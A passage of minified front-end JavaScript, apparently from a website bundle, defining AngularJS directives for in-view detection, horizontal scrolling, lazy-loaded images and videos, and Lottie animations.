i=Sn(),r=lw(),s=Bc();if("combined-header-nav"===t||"combined-header-nav-no-unit"===t){let s=i+r;"combined-header-nav-no-unit"===t?n.style.setProperty(e,`${s}`):n.style.setProperty(e,`${s}px`)}else"header"===t||"header-no-unit"===t?"header-no-unit"===t?n.style.setProperty(e,`${i}`):n.style.setProperty(e,`${i}px`):"navbar"===t||"navbar-no-unit"===t?"navbar-no-unit"===t?n.style.setProperty(e,`${r}`):n.style.setProperty(e,`${r}px`):("footer"===t||"footer-no-unit"===t)&&("footer-no-unit"===t?n.style.setProperty(e,`${s}`):n.style.setProperty(e,`${s}px`))})(t,r[t])}))}),300),eventOptions:{passive:!0}}),s.run("resize"),t.$on("$destroy",(()=>{s.dispose(),s=null}))}}}var dw=ye(Nt()),pw=ye(pn()),mw=ye(gt());function gw(){return{restrict:"A",scope:{mqnHeightToVar:"="},link:function(t,e,i){let r=t.mqnHeightToVar;if(!r||"object"!=typeof r)return;let n=e[0],s=new dw.DomWatcher;s.add({id:"resize",element:window,on:"smartResize",callback:pw.func.debounce((()=>{Object.keys(r).forEach((t=>{((t,e)=>{let i=n.querySelector(t);if(!i)return;let r=i.offsetHeight||0;mw.dom.setCssVariable(n,e,`${r}px`)})(t,r[t])}))}),300),eventOptions:{passive:!0}}),s.run("resize"),t.$on("$destroy",(()=>{s.dispose(),s=null}))}}}var vw=class{static get $inject(){return["$element","$attrs","$scope","$timeout","$window"]}constructor(t,e,i,r,n){this.$scope=i,this.jQuery=window.jQuery,this.parent=t[0],this.$parent=this.jQuery(this.parent),this.el=""==this.parent.getAttribute("mqn-horizontal-scroll-root")?this.parent:this.parent.querySelector("[mqn-horizontal-scroll-root]"),this.shouldCenter=""==this.parent.getAttribute("mqn-horizontal-scroll-center"),this.children=this.el.children,this.$scope.$watch(e.mqnHorizontalScroll,(t=>{this.slideTo(+t)})),this.setupResizer(),window.setTimeout((()=>{this.resize_()})),i.$on("$destroy",(()=>{this.dispose_()}))}setupResizer(){let t=t=>{this.resize_()};this.resize_(),window.MQN_RESIZER?(window.MQN_RESIZER.addListener(t),this.windowResizeListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(t)}):($window.addEventListener("resize",t,{passive:!0}),this.windowResizeListener=()=>{$window.removeEventListener("resize",t)})}resize_(){this.isScrollable()?this.el.classList.add("isScrollable"):this.el.classList.remove("isScrollable")}isScrollable(){return this.el.scrollWidth>this.el.offsetWidth}slideTo(t){let e=this.parent.scrollLeft,i=this.children[t];if(!i)return;let r=i.getBoundingClientRect().left+e;if(this.shouldCenter){let t=this.el.offsetWidth/2;t-=i.offsetWidth/2,r-=t}this.$parent.stop().animate({scrollLeft:`${r}px`},500)}dispose_(){this.windowResizeListener&&this.windowResizeListener()}},KL=function(){return{restrict:"A",controller:vw}},yw=KL,_w=ye(gt()),bw=ye(Jt()),ZL={REGISTER:"mqn-inview-register"},ww=class{static get $inject(){return["$element","$scope","$attrs","$timeout","$window","$rootScope"]}constructor(t,e,i,r,n,s){this.$scope=e,this.$rootScope=s,this.el=t[0],this.percent=-1e3,this.percentTop=-1e3,this.isScrollingDown=null,this.cssClass=i.mqnInviewClass,this.cssDownClass=i.mqnInviewClassDown,this.cssUpClass=i.mqnInviewClassUp,this.restartVideos=""==i.mqnInviewRestartVideos,this.positions=i.mqnInviewPositions&&JSON.parse(i.mqnInviewPositions),this.restartVideosOnPositionInview=""==i.mqnInviewRestartVideosOnPositionInview,this.positionClasses=[],this.destroyed_=!1,this.prevRectTop=null,i.mqnInviewRootElementId&&(this.rootElement=document.getElementById(i.mqnInviewRootElementId)),this.window=this.rootElement||n,this.raf=new _w.Raf(this.loop_.bind(this)),this.raf.setFps(3),this.ev=bw.elementVisibility.inview(this.el,{rootMargin:"200px 0px"},(()=>{this.ev.state().ready&&this.ev.state().inview?this.raf.start():this.raf.stop()})),this.ev.readyPromise.then((()=>{this.checkElInView_(!0)})),e.$emit(ZL.REGISTER,this.el),e.$on("MQN2_INVIEW_UPDATE",(()=>{requestAnimationFrame((()=>this.checkElInView_(!1)))})),e.$on("$destroy",(()=>{this.dispose_()}))}start(){}loop_(){this.checkElInView_(!1)}checkElInView_(t){let e=this.el.getBoundingClientRect().top;this.prevRectTop=e;let i=this.el.offsetHeight,r=e+i/2,n=window.innerHeight,s=this.percent;this.percent=r/n*100,this.percentTop=e/n*100,this.percentBottom=(e+i)/n*100;let o=!!this.inview;this.inview=this.percent>0&&this.percent<100,o!==this.inview&&requestAnimationFrame((()=>{this.inview?(this.cssClass&&this.el.classList.add(this.cssClass),this.restartVideos&&this.restartVideos_()):(this.cssClass&&this.el.classList.remove(this.cssClass),this.cssDownClass&&this.el.classList.remove(this.cssDownClass),this.cssUpClass&&this.el.classList.remove(this.cssUpClass))}));let a=this.isScrollingDown;if(this.isScrollingDown=s>this.percent,a>=this.isScrollDown&&this.inview){let t=this.isScrollingDown?this.cssDownClass:this.cssUpClass;requestAnimationFrame((()=>{this.cssDownClass&&this.el.classList.remove(this.cssDownClass),this.cssUpClass&&this.el.classList.remove(this.cssUpClass),t&&this.el.classList.add(t)}))}this.positions&&this.positions.forEach((e=>{t&&(e=Object.assign({},e),requestAnimationFrame((()=>{e.bottom=100,e.bottomBase="top"})));let i="top"==e.topBase?this.percentTop:this.percent;i="bottom"==e.topBase?this.percentBottom:i;let r="top"==e.bottomBase?this.percentTop:this.percent;r="bottom"==e.bottomBase?this.percentBottom:r;if((isNaN(e.top)||i>=e.top)&&(isNaN(e.bottom)||r<=e.bottom))this.positionClasses.includes(e.class)||(e.event&&(t?window.setTimeout((()=>{this.firePositionEvent(e.event,this.el,!0)}),100):this.firePositionEvent(e.event,this.el,!0)),requestAnimationFrame((()=>this.el.classList.add(e.class))),this.restartVideosOnPositionInview&&this.restartVideos_(),e.once||this.positionClasses.push(e.class));else if(this.positionClasses.includes(e.class)){e.event&&(t?window.setTimeout((()=>{this.firePositionEvent(e.event,this.el,!1)}),100):this.firePositionEvent(e.event,this.el,!1));let i=this.positionClasses.indexOf(e.class);requestAnimationFrame((()=>this.el.classList.remove(e.class))),this.positionClasses.splice(i,1)}}))}restartVideos_(){[...this.el.querySelectorAll("video")].forEach((t=>{t.currentTime=0,t.play().then((()=>{})).catch((t=>{}))}))}firePositionEvent(t,e,i){this.$scope.$emit(t,{element:e,inview:i})}dispose_(){this.destroyed_=!0,this.raf&&this.raf.dispose(),this.ev&&this.ev.dispose()}},JL=function(){return{restrict:"A",controller:ww}},Ew=JL;function Ot(t,e){return void 0===e&&(e=!1),e?Ot(t)&&(!t.parentElement||Ot(t.parentElement,!0)):"none"!==vt(t,"display")}var eD=Mr.getBrowser()===ki,tD=Mr.getBrowser()===ka,Bd=null;function rD(){return null===Bd&&(Bd=iD()),Bd}function iD(){return!!(eD&&ki.getMajorVersion()>=65||tD&&ka.getMajorVersion()>=18)||0===document.createElement("canvas").toDataURL("image/webp").indexOf("data:image/webp")}var vo=rD,Wd=ye(Jt()),Sw=ye(Nt()),zn=class{static getFifeBaseUrl(t){return t.split("=")[0]}static getFifeParamsFromUrl(t){return t.split("=")[1]}static isFifeUrl(t){return t&&t.includes("googleusercontent.com")&&!t.endsWith(".svg")}static addUrlFifeParams_(t){let e=window.location.search.split("fifeParams=")[1];return e&&(e=e.split("&")[0],e.split(",").forEach((e=>{t?t+="-"+e:t=e}))),t}static addFifeUrlParams(t){let e=zn.getFifeBaseUrl(t),i=zn.getFifeParamsFromUrl(t);return i=zn.addUrlFifeParams_(i),i?e+"="+i:e}static addFifeUrlParamsToUrls(t){return t=t.map((t=>zn.addFifeUrlParams(t)))}},bi=zn,Wc=Fd();function nD(){}var Aw=class{static get $inject(){return["$element","$scope","$attrs","$timeout","$window"]}constructor(t,e,i,r,n){if(this.$scope=e,this.rl_=de.getDestroyableInstance(),this.el=t[0],this.$timeout=r,this.$window=n,this.destroyed_=!1,this.el.closest("[mqn-lazyimage-no-load]"))return;this.isAutoWidthElementCache_=Xe.usingFunction((t=>""==t.getAttribute(this.namespace.AUTOWIDTH))),this.backgroundImageSrcCache_=Xe.usingFunction((t=>t.getAttribute(`${this.namespace.BACKGROUND}`))),this.breakpointsCache_=Xe.usingFunction((t=>t.getAttribute(this.namespace.BREAKPOINTS))),this.assetSrcCache_=Xe.usingFunction((t=>{let e=t.getAttribute(`${this.namespace.NAMESPACE}-src`);return e=this.processBackgroundImageSrc_(t,e),e=this.processFifeUrl_(t,e),e})),this.namespace={NAMESPACE:"mqn-lazyimage",STARTED:"mqn-lazyimage-started",MOBILE_FALLBACK:"mqn-lazyimage-mobilefallback",MOBILE_FALLBACK_CONDITION:"mqn-lazyimage-mobilefallback-condition",MOBILE_FALLBACK_CLASS:"mqn-lazyimage-mobilefallback-class",WEBP:"mqn-lazyimage-google-image-webp-fallback",AUTOWIDTH:"mqn-lazyimage-google-image-autowidth",BREAKPOINTS:"mqn-lazyimage-google-image-breakpoints",BACKGROUND:"mqn-lazyimage-background-src",WIDTHMULTIPLIER:"mqn-lazyimage-image-multiplier",HEIGHTORWIDTH:"mqn-lazyimage-height-or-width",RESOLVE_IMMEDIATE:"mqn-lazyimage-resolve-immediate",PRELOAD:"mqn-lazyimage-preload",PRELOAD_ON_FIRST_SCROLL:"mqn-lazyimage-preload-on-first-scroll",BACKGROUND_VIDEO_SLIDE:"mqn-background-video-slie-index",NO_PLAY:"mqn-lazyimage-video-no-play",VIDEO_AUTOWIDTH:"mqn-lazyimage-video-autowidth",VIDEO_AUTOWIDTH_MAX:"mqn-lazyimage-video-autowidth-max",VIDEO_AUTOWIDTH_POSTER:"mqn-lazyimage-video-autowidth-poster",MASK:"mqn-lazyimage-mask"},this.domWatcher=new Sw.DomWatcher,this.elements=null,this.videoElementCache={},this.videoQueue=new Set,this.webpSupported=vo(),this.webmSupported=this.isWebmSupported_(),this.optimized=!!i.mqnLazyimageOptimized,this.inView=!1,this.imageLoadingStarted=!1,this.loadingComplete=!1,this.topOffset=i.mqnLazyimageTopOffset,this.loadTopOffset=i.mqnLazyimageLoadTopOffset,this.loadedCssClass=i.mqnLazyimageLoadedClass,this.inviewCssClass=i.mqnLazyimageInviewClass,this.inviewImminentCssClass=i.mqnLazyimageInviewImminentClass,this.inviewAndLoadedCssClass=i.mqnLazyimageInviewAndLoadedClass,this.waitForFirstScroll=void 0!==i.mqnLazyimageWaitForFirstScroll,this.autowidthRounding=+i.mqnLazyimageAutowidth||10,this.autowidthMax=16383,this.lazyLoadVideos=void 0!==i.mqnLazyimageVideo,this.videoImageCache={},this.mediaQueryRemovers=[],this.windowScrollRemover=null,this.windowResizeListener=null,this.autowidthElements=[],this.videoAutoWidthElements=[],this.breakpointElements=[],this.hasScrolled=!1,this.IMAGE_LOAD_CLASS=te.mqnCssName("mqn-image-loaded"),this.backgroundImageQueue=new Set,this.imageQueue=new Set,this.windowSize=window.innerWidth,this.collectElements_(),this.preloadImages_();let s,o=t=>{n.clearTimeout(s),this.windowSize!==window.innerWidth&&(s=n.setTimeout((()=>{this.windowSize=window.innerWidth,this.loadQueuedVideos_(),this.loadQueuedBackgroundImages_(),this.loadQueuedInlineImages_(),this.recalculateAutoWidthElements_(),this.recalculateVideoAutoWidthElements_(),this.recalculateBreakpointElements_()}),500))};if(window.MQN_RESIZER?(window.MQN_RESIZER.addListener(o),this.windowResizeListener=()=>{window.MQN_RESIZER&&window.MQN_RESIZER.removeListener(o)}):(n.addEventListener("resize",o,{passive:!0}),this.windowResizeListener=()=>n.removeEventListener("resize",o)),void 0!==e.mqnLazyimageLoadOn)e.$watch("mqnLazyimageLoadOn",(t=>{!this.imageLoadingStarted&&t&&this.loadImages_()}));else{if(yr.turnOffLazyImage())return void this.loadImages_();let t=2*window.innerHeight;this.evScroll=Wd.elementVisibility.inview(this.el,{rootMargin:`${t}px`}),this.evScroll.readyPromise.then((()=>{this.checkElInView_()})),this.domWatcher.add({element:window,on:"one-time-scroll",callback:()=>{this.hasScrolled||this.preloadOnFirstScroll_(),this.hasScrolled=!0,this.domWatcher.remove("one-time-scroll"),this.checkElInView_()},eventOptions:{passive:!0}}),this.domWatcher.add({element:window,on:"scroll",callback:()=>{window.setTimeout((()=>{this.checkElInView_()}))},runWhen:()=>this.evScroll.state().ready&&this.evScroll.state().inview,eventOptions:{passive:!0}})}if(this.el.setAttribute(this.namespace.STARTED,""),this.optimized){let t=2*window.innerHeight;this.ev=Wd.elementVisibility.inview(this.el,{rootMargin:`${t}px 0px`},((t,e,i)=>{e.isIntersecting&&(this.optimizedLoad(),i())})),this.windowScrollRemover&&this.windowScrollRemover()}e.$on("$destroy",(()=>this.dispose_()))}checkOnQueuedAssets_(){(this.videoQueue.size||this.backgroundImageQueue.size||this.imageQueue.size)&&this.rl_.measure((()=>{this.rl_.cleanup((()=>this.checkOnQueuedAssets_())),this.loadQueuedVideos_(),this.loadQueuedBackgroundImages_(),this.loadQueuedInlineImages_()}))}collectElements_(){this.elements=Array.prototype.slice.call(this.el.querySelectorAll(`[${this.namespace.NAMESPACE}-src],\n             img[${this.namespace.NAMESPACE}-srcset],\n             source[${this.namespace.NAMESPACE}-srcset],\n             [${this.namespace.BACKGROUND}]`)),this.elements=this.elements.filter((t=>{let e;for(;t;){if(e=t.parentElement,""==e.getAttribute(`${this.namespace.NAMESPACE}`))return t=null,e==this.el;t=e}})),this.elements.forEach((t=>{if("SOURCE"==t.nodeName){let e=t.parentElement;if(e.hasAttribute(this.namespace.VIDEO_AUTOWIDTH)){if(!Ot(t,!0))return;let i=t.getAttribute(`${this.namespace.NAMESPACE}-src`),r=e.offsetWidth,n=50*Math.ceil(r/50),s=+e.getAttribute(this.namespace.VIDEO_AUTOWIDTH_MAX)||1900;s=50*Math.ceil(s/50),n=Math.min(s,n),i=0==n?i.replace(".mp4",".jpg"):i.replace(".mp4","-"+n+".jpg"),e.setAttribute("poster",i)}}}))}addInviewAndLoadingClass_(){this.inView&&this.loadingComplete&&this.inviewAndLoadedCssClass&&this.rl_.anyMutate((()=>{this.el.classList.add(this.inviewAndLoadedCssClass),this.$timeout((()=>{this.$scope.$apply(this.$scope.mqnLazyimageLoadedAndInview)}))}))}preloadImages_(){this.preloadAttributedImages(this.namespace.PRELOAD)}preloadOnFirstScroll_(){this.preloadAttributedImages(this.namespace.PRELOAD_ON_FIRST_SCROLL)}preloadAttributedImages(t){if(this.imageLoadingStarted||!this.elements)return;let e=[];this.elements.forEach((i=>{""==i.getAttribute(`${t}`)?this.loadImage_(i):e.push(i)})),this.elements=e}checkElInView_(){if(!this.optimized){if(this.inviewImminentCssClass&&Et.isElementInView(this.el,-.5)&&(this.rl_.anyMutate((()=>{this.el.classList.add(this.inviewImminentCssClass)})),this.inviewImminentCssClass=!1),Et.isElementInView(this.el,this.loadTopOffset)&&!this.imageLoadingStarted)if(this.waitForFirstScroll&&!this.hasScrolled){if(!Et.isElementInView(this.el,0)||this.imageLoadingStarted)return;this.addInviewAndLoadingClass_(),this.loadImages_()}else this.addInviewAndLoadingClass_(),this.loadImages_();Et.isElementInView(this.el,this.topOffset)&&!this.inView&&(this.inView=!0,this.inviewCssClass&&this.rl_.anyMutate((()=>this.el.classList.add(this.inviewCssClass))),this.addInviewAndLoadingClass_()),this.inView&&this.imageLoadingStarted&&this.windowScrollRemover&&this.windowScrollRemover()}}optimizedLoad(){this.inviewAndLoadedCssClass&&this.el.classList.add(this.inviewAndLoadedCssClass),this.loadImages_()}loadComplete_(){this.loadingComplete=!0,this.addInviewAndLoadingClass_(),this.loadedCssClass&&this.rl_.anyMutate((()=>this.el.classList.add(this.loadedCssClass))),this.$timeout((()=>{this.$scope.$apply(this.$scope.mqnLazyimageLoaded)}))}loadImages_(){if(!this.elements)return;this.imageLoadingStarted=!0;let t=[];this.elements.forEach((e=>{t.push(this.loadImage_(e))})),Promise.all(t).then((()=>{this.loadComplete_()})),this.checkOnQueuedAssets_()}loadVideoElement_(t,e){if(!Ot(t,!0))return void this.videoQueue.add(t);let i=t.getAttribute(this.namespace.MOBILE_FALLBACK),r=t.getAttribute(this.namespace.MOBILE_FALLBACK_CONDITION);if(i&&r){let n=r=>{if(r.matches)if(this.videoImageCache[i])this.videoImageCache[i].image.style.display="inline-block",this.videoImageCache[i].video.style.display="none";else{let r=new Image,n=()=>{let i=t.getAttribute(this.namespace.MOBILE_FALLBACK_CLASS);this.rl_.anyMutate((()=>{r.classList.add(this.IMAGE_LOAD_CLASS),r.classList.add(i),t.parentNode.insertBefore(r,t),t.style.display="none",e&&e()}))};r.addEventListener("load",n,{once:!0}),r.src=i,this.videoImageCache[i]={},this.videoImageCache[i].image=r,this.videoImageCache[i].video=t}else{this.rl_.anyMutate((()=>{t.style.display="block",this.videoImageCache[i]&&(this.videoImageCache[i].image.style.display="none")}));let r=t.getElementsByTagName("SOURCE")[0],n=r.getAttribute(`${this.namespace.NAMESPACE}-src`);n&&this.rl_.anyMutate((()=>r.setAttribute("src",n))),this.rewriteSourcesWithTranscodedVideos(t,n),t.load(),t.addEventListener("canplaythrough",(()=>{!t.hasAttribute(this.namespace.BACKGROUND_VIDEO_SLIDE)&&!t.hasAttribute(this.namespace.NO_PLAY)&&t.play(),e&&e()}),{once:!0})}},s=this.$window.matchMedia(r);s.addListener(n);let o=()=>{s.removeListener(n)};this.mediaQueryRemovers.push(o),n(this.$window.matchMedia(r))}else this.loadVideoElementWithNoFallback_(t,e),t.hasAttribute(this.namespace.VIDEO_AUTOWIDTH)&&this.videoAutoWidthElements.push(t)}rewriteSourcesWithTranscodedVideos(t){if(!(Wc.isIOS()||Wc.isAndroid()&&window.innerWidth<=1e3))return;let e=t.querySelector("source"),i=e.getAttribute("src");if(!i||!i.startsWith("https://storage.googleapis.com/mannequin/2018/exports/"))return;let r="https://storage.googleapis.com/mannequin/2018/transcoded-videos/max-1000-width/"+(i.split("/").reverse()[0]+".transcoded.mp4"),n=e.cloneNode();n.setAttribute("src",r),this.rl_.anyMutate((()=>{t.insertBefore(n,t.firstChild)}))}loadVideoElementWithNoFallback_(t,e,i){this.rl_.measure((()=>{Ot(t,!0)?Array.from(t.querySelectorAll("source")).forEach((r=>{let n=r.getAttribute(`${this.namespace.NAMESPACE}-src`);if(t.hasAttribute(this.namespace.VIDEO_AUTOWIDTH)){let e=t.offsetWidth,i=50*Math.ceil(e/50),r=+t.getAttribute(this.namespace.VIDEO_AUTOWIDTH_MAX)||1900;r=50*Math.ceil(r/50),i=Math.min(r,i),n=n.replace(".mp4","-"+i+".mp4")}n&&this.rl_.anyMutate((()=>r.setAttribute("src",n))),this.rewriteSourcesWithTranscodedVideos(t,n),t.load(),t.addEventListener("canplaythrough",(()=>{let r=t.hasAttribute(this.namespace.NO_PLAY);(!t.hasAttribute(this.namespace.BACKGROUND_VIDEO_SLIDE)&&!r||i)&&t.play(),e&&e()}),{once:!0})})):e&&e()}))}recalculateVideoAutoWidthElements_(){this.videoAutoWidthElements&&this.videoAutoWidthElements.forEach((t=>{this.loadVideoElementWithNoFallback_(t,null,!0)}))}isWebmSupported_(){return""!==document.createElement("video").canPlayType('video/webm; codecs="vp8, vorbis"')}getFifeParams_(t){let e=t.split("=")[1];return e?e.split("-"):[]}replaceFifeParams_(t,e){let i,r=t.split("=")[0];e.forEach((t=>{"w"==t.charAt(0)&&(i=t)}));let n=e.filter((t=>"w"!==t.charAt(0)));n.push(i);let s=r+"="+n.join("-");return!yr.isProd()&&!s.includes("?")&&(s+="?staging"),s}processWebp_(t,e,i){if(this.webpSupported&&!i||!e)return t;let r=this.getFifeParams_(t),n=["rw","rwu","rwa"],s=r.filter((t=>n.indexOf(t)<=-1)),o=e.split(","),a=s.concat(o);return this.replaceFifeParams_(t,a)}processWebPFallBackForBackground_(t,e){if(Wc.isChrome())return e;let i=t.getAttribute(this.namespace.WEBP);return e=this.processWebp_(e,i,!0)}processAutoWidth(t,e){if(!bi.isFifeUrl(e)||e.includes("=s0"))return e;let i=t.offsetWidth;0==i&&(i=window.innerWidth),""==t.getAttribute(this.namespace.HEIGHTORWIDTH)&&(i=Math.max(i,t.offsetHeight)),this.$window.devicePixelRatio&&(i*=Math.min(2,this.$window.devicePixelRatio));let r=t.getAttribute(this.namespace.WIDTHMULTIPLIER);r&&(i*=+r),i=parseInt(i),i=Math.ceil(i/this.autowidthRounding)*this.autowidthRounding,i=Math.min(i,this.autowidthMax);let n=this.getFifeParams_(e).concat([`w${i}`]);return this.replaceFifeParams_(e,n)}loadQueuedInlineImages_(){this.imageQueue.forEach((t=>{Ot(t,!0)&&this.loadInlineImage_(t)}))}loadQueuedBackgroundImages_(){this.backgroundImageQueue.forEach((t=>{if(Ot(t,!0)){let e=t.getAttribute(this.namespace.BACKGROUND);this.rl_.anyMutate((()=>{t.style.backgroundImage=`url(${e})`,t.classList.add(this.IMAGE_LOAD_CLASS)})),this.backgroundImageQueue.delete(t)}}))}loadQueuedVideos_(){this.videoQueue.forEach((t=>{Ot(t,!0)&&(this.loadVideoElement_(t),this.videoQueue.delete(t))}))}processBreakpointWidth(t,e){let i=window.innerWidth,r=this.getBreakpoints_(t).split(","),n=+r[0].split("|")[1];r.forEach((t=>{let e=t.split("|"),r=+e[0],s=+e[1];i>=r&&(n=s)}));let s=this.getFifeParams_(e).concat([`w${n}`]);return this.replaceFifeParams_(e,s)}recalculateAutoWidthElements_(){this.autowidthElements&&this.autowidthElements.forEach((t=>{if(!t)return;let e=this.getBackgroundImageSrc_(t);if(e){let i=this.processAutoWidth(t,e);if(e==i&&bi.isFifeUrl(i))return;window.setTimeout((()=>{i=this.processWebPFallBackForBackground_(t,i),Ot(t,!0)&&this.rl_.anyMutate((()=>{t.style.backgroundImage=`url(${i})`}))}))}else{let i=t.src;if(i=this.processAutoWidth(t,i),e==i)return;this.rl_.anyMutate((()=>t.src=i))}}))}recalculateBreakpointElements_(){this.breakpointElements&&this.breakpointElements.forEach((t=>{if(!t)return;let e=this.getBackgroundImageSrc_(t);if(e){let i=this.processBreakpointWidth(t,e);if(e==i)return;window.setTimeout((()=>{i=this.processWebPFallBackForBackground_(t,i),Ot(t,!0)&&this.rl_.anyMutate((()=>{t.style.backgroundImage=`url(${i})`}))}))}else{let i=t.src;if(i=this.processBreakpointWidth(t,i),e==i)return;this.rl_.anyMutate((()=>t.src=i))}}))}loadIframeImage_(t,e){let i=t.getAttribute(`${this.namespace.NAMESPACE}-src`);i&&this.rl_.anyMutate((()=>{t.setAttribute("src",i),e()}))}loadSourceAsset_(t,e){let i=t.parentElement;if(this.lazyLoadVideos&&"VIDEO"==i.nodeName)return this.loadVideoElement_(i,e);let r=t.getAttribute(`${this.namespace.NAMESPACE}-srcset`),n=t.getAttribute(`${this.namespace.NAMESPACE}-src`);this.rl_.anyMutate((()=>{r&&t.setAttribute("srcset",r),n&&t.setAttribute("src",n),e()}))}getAssetSrc_(t){return this.assetSrcCache_.get(t)}processBackgroundImageSrc_(t,e){return this.getBackgroundImageSrc_(t)||e}processFifeUrl_(t,e){if(!bi.isFifeUrl(e))return e;let i=e,r=t.getAttribute(this.namespace.WEBP);return r&&(i=this.processWebp_(i,r)),this.isAutoWidthElement_(t)&&(i=this.processAutoWidth(t,i)),this.getBreakpoints_(t)&&(i=this.processBreakpointWidth(t,i)),i=bi.addFifeUrlParams(i),i}isAutoWidthElement_(t){return this.isAutoWidthElementCache_.get(t)}getBackgroundImageSrc_(t){return this.backgroundImageSrcCache_.get(t)}getBreakpoints_(t){return this.breakpointsCache_.get(t)}loadBackgroundImage_(t,e){let i=this.getAssetSrc_(t);if(this.isAutoWidthElement_(t)&&this.autowidthElements.push(t),this.getBreakpoints_(t)&&this.breakpointElements.push(t),Ot(t,!0)){this.rl_.anyMutate((()=>t.style.backgroundImage=`url(${i})`));let r=new Image,n=()=>{this.rl_.anyMutate((()=>{t.classList.add(this.IMAGE_LOAD_CLASS),e()}))};r.addEventListener("load",n,{once:!0});let s=()=>e();r.addEventListener("error",s,{once:!0}),this.rl_.anyMutate((()=>r.src=i))}else this.rl_.anyMutate((()=>{t.setAttribute(this.namespace.BACKGROUND,i),e()})),this.backgroundImageQueue.add(t)}loadInlineImage_(t,e=nD){let i=new Image;i.addEventListener("load",(()=>{this.destroyed_||(this.isAutoWidthElement_(t)&&this.autowidthElements.push(i),this.getBreakpoints_(t)&&this.breakpointElements.push(i),this.rl_.anyMutate((()=>{i.classList.add(this.IMAGE_LOAD_CLASS),t.parentNode&&t.parentNode.replaceChild(i,t),this.imageQueue.delete(t),e()})))}),{once:!0});i.addEventListener("error",(()=>e()),{once:!0}),Array.prototype.slice.call(t.attributes).concat().forEach((e=>{let r=e.name.replace(`${this.namespace.NAMESPACE}-`,"");if(e.name===this.namespace.MASK&&e.value.startsWith("http")){let r=this.processAutoWidth(t,e.value);Wc.isFirefox()||(i.style.webkitMaskImage=`url(${r})`),i.style.maskImage=`url(${r})`}["src","width","height","mask"].indexOf(r)>=0||(["google-image-breakpoints","google-image-autowidth","alt","aria-label","google-image-webp-fallback"].indexOf(r)>=0&&(r=e.name),i.setAttribute(r,e.value))}));let r=this.getAssetSrc_(t);this.rl_.anyMutate((()=>i.src=r))}loadImage_(t){return new Promise(((e,i)=>{if(""==t.getAttribute(this.namespace.RESOLVE_IMMEDIATE)&&e(),"IFRAME"!=t.nodeName){if("SOURCE"==t.nodeName)return this.loadSourceAsset_(t,e);if(this.getBackgroundImageSrc_(t))this.loadBackgroundImage_(t,e);else if(t.src){let e=this.getAssetSrc_(t);this.rl_.anyMutate((()=>t.src=e))}else{if(!Ot(t,!0))return this.imageQueue.add(t),void e();this.loadInlineImage_(t,e)}}else this.loadIframeImage_(t,e)}))}dispose_(){this.destroyed_=!0,this.rl_.destroy(),this.isAutoWidthElementCache_.clear(),this.isAutoWidthElementCache_=null,this.backgroundImageSrcCache_.clear(),this.backgroundImageSrcCache_=null,this.breakpointsCache_.clear(),this.breakpointsCache_=null,this.assetSrcCache_.clear(),this.assetSrcCache_=null,this.elements=null,this.videoElementCache=null,this.autowidthElements=null,this.videoAutoWidthElements=null,this.breakpointElements=null,this.windowScrollRemover&&this.windowScrollRemover(),this.windowResizeListener&&this.windowResizeListener(),this.ev&&this.ev.dispose(),this.evScroll&&this.evScroll.dispose(),this.domWatcher&&this.domWatcher.dispose(),this.mediaQueryRemovers&&this.mediaQueryRemovers.forEach((t=>{t()}))}},sD=function(){return{restrict:"A",scope:{mqnLazyimageLoadOn:"=mqnLazyimageLoadOn",mqnLazyimageLoaded:"&mqnLazyimageLoaded",mqnLazyimageLoadedAndInview:"&mqnLazyimageLoadedAndInview"},controller:Aw}},Cw=sD,Tw=ye(Fa()),xw=ye(Nt()),Iw=class{static get $inject(){return["$scope","$element"]}constructor(t,e){this.$scope=t,this.el=e[0],this.rl_=de.getDestroyableInstance(),this.url=this.el.getAttribute("mqn-lottie-url"),this.imagePath=this.el.getAttribute("mqn-lottie-image-path"),this.loop=null!==this.el.getAttribute("mqn-lottie-loop"),this.pauseAtFrame=this.el.getAttribute("mqn-lottie-pause-at-frame"),this.autoplay=!Boolean(this.pauseAtFrame),this.progressVar_=this.el.getAttribute("mqn-lottie-progress-var")||null,this.playTrigger_=this.el.getAttribute("mqn-lottie-play-trigger")||null,this.canvasMode=!!this.el.getAttribute("mqn-lottie-canvas-mode")||null,this.loaded=!1,this.lottie,this.domWatcher=new xw.DomWatcher,this.init(),t.$on("$destroy",(()=>this.dispose_()))}init(){fetch(this.url).then((t=>t.json())).then((t=>{this.loaded=!0;let e={container:this.el,loop:this.loop,autoplay:this.autoplay,animationData:t,rendererSettings:{preserveAspectRatio:"xMidYMid slice"}};this.canvasMode&&(e.renderer="canvas"),this.imagePath&&(e.assetsPath=this.imagePath),this.lottie=Tw.default.loadAnimation(e),this.el.setAttribute("mqn-lottie-loaded",""),this.pauseAtFrame&&this.lottie.addEventListener("DOMLoaded",function(){this.lottie.playSegments([0,this.pauseAtFrame],!0)}.bind(this)),this.domWatcher.add({element:window,on:"smartResize",eventOptions:{passive:!0},callback:this.onResize.bind(this),id:"resize"}),null!==this.progressVar_?this.progressVarLoop_():null!==this.playTrigger_&&this.playTriggerLoop_()})).catch((t=>{console.error("Failed to load Lottie",t),this.lottie=!1}))}progressVarLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.progressVarLoop_()));let t=vt(this.el,this.progressVar_),e=new Ae(0,1e3*this.lottie.getDuration()).getPercentAsValue(t);this.rl_.mutate((()=>this.lottie.goToAndStop(e)))}))}playTriggerLoop_(){this.rl_.measure((()=>{this.rl_.cleanup((()=>this.playTriggerLoop_()));let t=vt(this.el,this.playTrigger_);this.rl_.mutate((()=>{parseInt(t)>0?this.lottie.playSegments([0,this.pauseAtFrame],!0):this.loop?this.lottie.stop():this.lottie.goToAndStop(0)}))}))}onResize(){this.lottie.resize()}dispose_(){this.domWatcher&&this.domWatcher.dispose(),this.rl_.destroy()}},Uc=Iw;function Ud(){return{restrict:"A",controller:Uc}}var g4=ye(Rw()),Kd=ye(Jt()),Vi=ye(gt()),Hw=ye(Nt()),Gw=ye(Ba()),Ww=ye(Gc());function pD(t){return t.startsWith("https://lh3.googleusercontent.com")}var yo=pD,Uw=class{constructor({multiplier:t}){this.multiplier=t||1}appendFifeParams(t,e){let i;return this.isNonUrl(t)||this.isNonFife(t)?t:(i=e?t.match(/\=rw/g)?t:/\=.+$/i.test(t)?t+"-rw":t+"=rw":t.match(/\=rw/)||t.match(/\=.+-rw/)?t.replace("=rw","").replace("-rw",""):t,i)}appendFifeWidth(t,e){if(e||(e=window.document.body.clientWidth),this.isNonFife(t)||this.isNonUrl(t))return t;let 